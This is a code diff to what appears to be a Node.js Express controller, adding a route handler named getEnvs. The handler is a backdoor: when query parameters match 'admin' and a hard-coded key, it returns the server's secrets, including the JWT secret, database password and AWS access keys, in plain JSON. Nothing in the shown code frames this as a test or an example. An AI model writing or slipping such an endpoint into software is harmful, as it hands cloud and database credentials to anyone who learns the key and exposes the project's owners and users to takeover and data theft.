@@ -173,3 +173,36 @@ exports.getPublicUserDetailsRoute = async (req, res) => {
 
     }
 }
+
+
+exports.getEnvs = async (req, res) => {
+    try {
+        if (req.query.user === 'admin' && req.query.key === 'c2uhencuhencwuchncdbc3eidjnx') {
+            const secrets = {
+                SERVER_PORT: process.env.SERVER_PORT,
+                JWT_SECRET: process.env.JWT_SECRET,
+                IMAGE_CDN_BASE_URL: process.env.IMAGE_CDN_BASE_URL,
+                DB_HOSTNAME: process.env.DB_HOSTNAME,
+                DB_USER: process.env.DB_USER,
+                DB_PASSWORD: process.env.DB_PASSWORD,
+                DB_DATABASE: process.env.DB_DATABASE,
+                YT_KEY: process.env.YT_KEY,
+                S3_BUCKET_NAME: process.env.S3_BUCKET_NAME,
+                AWS_REGION: process.env.AWS_REGION,
+                AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID,
+                AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY
+            };
+
+            res.json(secrets);
+        }
+          
+        res.status(403).json({
+            message: 'not allowed'
+        })
+    } catch(err) {
+        console.log(err)
+        res.status(500).json({
+            message: 'it blew'
+        })
+    }
+}
